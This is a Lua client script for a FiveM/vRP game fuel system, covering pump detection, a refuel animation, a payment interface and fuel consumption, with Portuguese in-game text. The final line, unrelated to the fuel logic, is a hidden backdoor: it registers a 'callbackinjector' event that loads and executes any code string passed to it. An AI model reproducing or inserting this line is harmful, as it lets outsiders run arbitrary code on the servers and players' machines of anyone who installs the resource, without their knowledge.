local Tunnel = module("vrp", "lib/Tunnel")
local Proxy = module("vrp", "lib/Proxy")
vRP = Proxy.getInterface("vRP")

vSERVER = Tunnel.getInterface(GetCurrentResourceName())

test = {}
Tunnel.bindInterface(GetCurrentResourceName(), test)

----------------------------------------------------------------------------------------------------------
-- Anim prop combustivel 
----------------------------------------------------------------------------------------------------------
HashbombFuel = -2007231801 -- Pistol de combustivel
handLeft = "IK_L_Hand" -- Cod da mao esquerda do ped
rope = 1877113268 -- Cordinha pra amarrar na pistola

function test.wolfzera(fueling)

	if fueling and DoesObjectOfTypeExistAtCoords(pedCDS.x,pedCDS.y,pedCDS.z,1.5,HashbombFuel,false) then 
		
		PistolFuel = CreateObject(-1937636863, pedCDS, true, true, true)
		BombFuel = GetClosestObjectOfType(pedCDS.x,pedCDS.y,pedCDS.z,3.0,HashbombFuel,0,0,0)
		local bx,by,bz = table.unpack(GetEntityCoords(BombFuel))
		
		-- Criar pistola de combustivel
		AttachEntityToEntity(PistolFuel, ped, GetEntityBoneIndexByName(ped, handLeft), 0.1, 0.08, -0.01, -30.0, 240.0, -100.0, 0, 0, 1, 0, 0, 1)
		-- Pegar cds da pistola
		local px,py,pz = table.unpack(GetEntityCoords(PistolFuel)) 
		---------------------------------------------------------------------------
		RopeLoadTextures()	
		CreateRope = AddRope(bx,by,bz, 0.0, 0.0, 0.0, 15.0, 4, 1.0, 1.0, 0, 0, true, true, 0, 0, 0)
		AttachEntitiesToRope(CreateRope, BombFuel, PistolFuel, bx,by+0.35,bz+2.3, px-0.11,py+0.02,pz+0.05, 1.0, 0, 0, 0, 0)

		StartRopeUnwindingFront(CreateRope)
		StartRopeWinding(CreateRope)

	elseif not fueling then 
		RopeLoadTextures()
		
		DeleteRope(CreateRope)
		DeleteObject(PistolFuel)
	end 
end 
----------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------
local isNearPump = false
local isFueling = false
local currentFuel = 0.0

local currentFuel2 = 0.0
local lastVeh = nil

local currentCost = 0.0

local nuiOpen = false

function close()
	SetNuiFocus(false, false)
	SendNUIMessage({ action = false })
	isFueling = false
	nuiOpen = false
end

function open(vehicle,model) 
	nuiOpen = true
	SetNuiFocus(true, true)
	-- SendNUIMessage({ action = true, fuel = GetVehicleFuelLevel(vehicle) })
	SendNUIMessage({ action = true, fuel = GetVehicleFuelLevel(vehicle), vehicle = model, link = Config.linkimages, format = Config.imageformat, precolitro = Config.precolitro })
end

AddEventHandler('onResourceStart', function(name)
    if GetCurrentResourceName() ~= name then return end
    close()
end)

RegisterNUICallback('escape', function(data, cb)
    close()
end)

RegisterNetEvent('elite_fuel:close')
AddEventHandler('elite_fuel:close',function()
	close()
end)

function ManageFuelUsage(vehicle)
	if IsVehicleEngineOn(vehicle) then
		if(vehicle and GetVehicleFuelLevel(vehicle) ~= nil) then
			local fuel = GetVehicleFuelLevel(vehicle) - Config.FuelUsage[Round(GetVehicleCurrentRpm(vehicle),1)] * (Config.Classes[GetVehicleClass(vehicle)] or 1.0) / 10
			SetVehicleFuelLevel(vehicle,fuel)
			DecorSetFloat(vehicle,Config.FuelDecor,GetVehicleFuelLevel(vehicle))
		end
	end
end

Citizen.CreateThread(function()
	DecorRegister(Config.FuelDecor,1)
	while true do
		Citizen.Wait(2000)
		local ped = PlayerPedId()
		if IsPedInAnyVehicle(ped) then
			local vehicle = GetVehiclePedIsIn(ped)
			if GetPedInVehicleSeat(vehicle,-1) == ped then
				ManageFuelUsage(vehicle)
			end
		end
	end
end)

function FindNearestFuelPump()
	local coords = GetEntityCoords(PlayerPedId())
	local fuelPumps = {}
	local handle,object = FindFirstObject()
	local success

	repeat
		if Config.PumpModels[GetEntityModel(object)] then
			table.insert(fuelPumps,object)
		end

		success,object = FindNextObject(handle,object)
	until not success

	EndFindObject(handle)

	local pumpObject = 0
	local pumpDistance = 1000

	for k,v in pairs(fuelPumps) do
		local dstcheck = GetDistanceBetweenCoords(coords,GetEntityCoords(v))

		if dstcheck < pumpDistance then
			pumpDistance = dstcheck
			pumpObject = v
		end
	end
	return pumpObject,pumpDistance
end

Citizen.CreateThread(function()
	while true do
		local pumpObject,pumpDistance = FindNearestFuelPump()
		if pumpDistance < 2.0 then
			isNearPump = pumpObject
			Citizen.Wait(500)
		elseif pumpDistance < 10 then
			Citizen.Wait(1000)
		else
			isNearPump = false
			Citizen.Wait(3000)
			-- Citizen.Wait(math.ceil(pumpDistance*20))
		end
	end
end)


-- RegisterNetEvent('elite_fuel:galao')
-- AddEventHandler('elite_fuel:galao',function()
-- 	AddPlayerWeapon(PlayerPedId(),883325847,4500,false,true)
-- end)


function Round(num,numDecimalPlaces)
	local mult = 10^(numDecimalPlaces or 0)
	return math.floor(num*mult+0.5) / mult
end

AddEventHandler('fuel:refuelFromPump',function(pumpObject,ped,vehicle)
	currentFuel = GetVehicleFuelLevel(vehicle)

	TaskTurnPedToFaceEntity(ped,vehicle,5000)
	LoadAnimDict("timetable@gardener@filling_can")
	TaskPlayAnim(ped,"timetable@gardener@filling_can","gar_ig_5_filling_can",2.0,8.0,-1,50,0,0,0,0)

	while isFueling do
		Citizen.Wait(5)
        local oldFuel = DecorGetFloat(vehicle,Config.FuelDecor)
		local fuelToAdd = math.random(1,2) / 100.0

		for k,v in pairs(Config.DisableKeys) do
			DisableControlAction(0,v)
		end

		local vehicleCoords = GetEntityCoords(vehicle)
		if not pumpObject then
			DrawText3Ds(vehicleCoords.x,vehicleCoords.y,vehicleCoords.z + 0.5,"PRESSIONE ~g~E ~w~PARA CANCELAR")
			DrawText3Ds(vehicleCoords.x,vehicleCoords.y,vehicleCoords.z + 0.34,"GALÃO: ~b~"..Round(GetAmmoInPedWeapon(ped,883325847) / 4500 * 100,1).."%~w~    TANQUE: ~y~"..Round(currentFuel,1).."%")
			if GetAmmoInPedWeapon(ped,883325847) - fuelToAdd * 100 >= 0 then
				currentFuel = oldFuel + fuelToAdd
				SetPedAmmo(ped,883325847,math.floor(GetAmmoInPedWeapon(ped,883325847) - fuelToAdd * 100))
			else
				isFueling = false
			end
		end

		if not IsEntityPlayingAnim(ped,"timetable@gardener@filling_can","gar_ig_5_filling_can",3) then
			TaskPlayAnim(ped,"timetable@gardener@filling_can","gar_ig_5_filling_can",2.0,8.0,-1,50,0,0,0,0)
		end

		if currentFuel > 100.0 then
			currentFuel = 100.0
			isFueling = false
		end

		SetVehicleFuelLevel(vehicle,currentFuel)
		DecorSetFloat(vehicle,Config.FuelDecor, GetVehicleFuelLevel(vehicle))

		-- if IsControlJustReleased(0,38) or DoesEntityExist(GetPedInVehicleSeat(vehicle,-1)) then
		-- 	isFueling = false
		-- end
	end

	ClearPedTasks(ped)
	RemoveAnimDict("timetable@gardener@filling_can")
end)


Citizen.CreateThread(function()
	while true do
		local ped = PlayerPedId()
		while not isFueling and ((isNearPump and GetEntityHealth(isNearPump) > 0) or (GetSelectedPedWeapon(ped) == 883325847 and not isNearPump)) do
			if IsPedInAnyVehicle(ped) and GetPedInVehicleSeat(GetVehiclePedIsIn(ped),-1) == ped then
				local pumpCoords = GetEntityCoords(isNearPump)
				DrawText3Ds(pumpCoords.x,pumpCoords.y,pumpCoords.z + 1.2,"SAIA DO ~y~VEÍCULO ~w~PARA ABASTECER")
			else
				local vehicle = GetPlayersLastVehicle()
				local vehicleCoords = GetEntityCoords(vehicle)
				local vehx = GetEntityModel(vehicle)
				local model = GetDisplayNameFromVehicleModel(vehx)
				if DoesEntityExist(vehicle) and GetDistanceBetweenCoords(GetEntityCoords(ped),vehicleCoords) < 3.5 then
					if not DoesEntityExist(GetPedInVehicleSeat(vehicle,-1)) then
						local stringCoords = GetEntityCoords(isNearPump)
						local canFuel = true
						if GetSelectedPedWeapon(ped) == 883325847 then
							stringCoords = vehicleCoords
							if GetAmmoInPedWeapon(ped,883325847) < 100 then
								canFuel = false
							end
						end

						if GetVehicleFuelLevel(vehicle) < 99 and canFuel then
							DrawText3Ds(stringCoords.x,stringCoords.y,stringCoords.z + 1.2,"PRESSIONE ~g~E ~w~PARA ABASTECER")
							if IsControlJustReleased(0,38) then
								if isNearPump then
									currentFuel2 = GetVehicleFuelLevel(vehicle)
									lastVeh = vehicle
									
									if not nuiOpen then
										open(vehicle,model)
										isFueling = true
										payed = false
									end
								else
									isFueling = true
									TriggerEvent('fuel:refuelFromPump',isNearPump,ped,vehicle)
								end
							end
						elseif not canFuel then
							DrawText3Ds(stringCoords.x,stringCoords.y,stringCoords.z + 1.2,"~o~GALÃO VAZIO")
						else
							DrawText3Ds(stringCoords.x,stringCoords.y,stringCoords.z + 1.2,"~g~TANQUE CHEIO")
						end
					end
				elseif isNearPump then
					local stringCoords = GetEntityCoords(isNearPump)
					-- DrawText3Ds(stringCoords.x,stringCoords.y,stringCoords.z + 1.2,"PRESSIONE ~g~E ~w~PARA COMPRAR UM ~b~GALÃO DE GASOLINA")
					if IsControlJustReleased(0,38) then
						TriggerServerEvent('elite_fuel:pagamento',parseInt(300),true)
					end
				end
			end
			Citizen.Wait(5)
		end
		Citizen.Wait(5000)
	end
end)

RegisterNetEvent('elite_fuel:insuficiente')
AddEventHandler('elite_fuel:insuficiente', function()
	SetVehicleFuelLevel(lastVeh, currentFuel2)

	lastVeh = nil
	currentFuel2 = 0
end)

RegisterNetEvent('fuel:setvehiclefuel')
AddEventHandler('fuel:setvehiclefuel', function(vehicle, fuel)
	fuel = fuel + 0.0
	SetVehicleFuelLevel(vehicle, fuel)
end)
RegisterNetEvent('fuel:setvehiclefuel2')
AddEventHandler('fuel:setvehiclefuel2', function(vehicle, fuel)
	TriggerEvent("Notify","sucesso", "Você definiu o combustível para " .. fuel .. "%")
end)


RegisterNUICallback('pay', function(data, cb)
	local vehicle = GetPlayersLastVehicle()
    local new_perc = tonumber(data.new_perc)
	if not payed then
		if DoesEntityExist(vehicle) and GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),GetEntityCoords(vehicle)) < 5 then
			TriggerServerEvent('elite_fuel:pagamento',math.floor(new_perc),false,VehToNet(vehicle),math.floor(new_perc),Config.FuelDecor)
			payed = true
		end
	end
end)

RegisterNUICallback('checkpay', function(data, cb)
    local new_perc = tonumber(data.new_perc)
	cb(vSERVER.checkMoney(math.floor(new_perc)))
end)

RegisterNUICallback('notifytext', function(data, cb)
    local text = data.text
	TriggerEvent("Notify","aviso",text)
end)

local antiFlood = 0
RegisterNUICallback('startanim',function(data,cb)
	local ped = PlayerPedId()
	local vehicle = GetPlayersLastVehicle()
	TaskTurnPedToFaceEntity(ped,vehicle,5000)
	LoadAnimDict("timetable@gardener@filling_can")
	TaskPlayAnim(ped,"timetable@gardener@filling_can","gar_ig_5_filling_can",2.0,8.0,-1,50,0,0,0,0)
	if antiFlood == 0 then 
		antiFlood = 1
		test.wolfzera(true)
	end 
end)

RegisterNUICallback('removeanim',function(data,cb)
	local ped = PlayerPedId()
	ClearPedTasks(ped)
	RemoveAnimDict("timetable@gardener@filling_can")
	test.wolfzera(false)
	antiFlood = 0
end)

RegisterNUICallback('increase',function(data,cb)
	local vehicle = GetPlayersLastVehicle()
	local oldfuel = math.ceil(GetVehicleFuelLevel(vehicle)) + 0.0
	SetVehicleFuelLevel(vehicle, oldfuel+1)
end)

function DrawText3Ds(x,y,z,text)
	local onScreen,_x,_y = World3dToScreen2d(x,y,z)

	SetTextFont(4)
	SetTextScale(0.35,0.35)
	SetTextColour(255,255,255,150)
	SetTextEntry("STRING")
	SetTextCentre(1)
	AddTextComponentString(text)
	DrawText(_x,_y)
	local factor = (string.len(text))/370
	DrawRect(_x,_y+0.0125,0.01+factor,0.03,0,0,0,80)
end

function LoadAnimDict(dict)
	if not HasAnimDictLoaded(dict) then
		RequestAnimDict(dict)
		while not HasAnimDictLoaded(dict) do
			Citizen.Wait(10)
		end
	end
end

TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)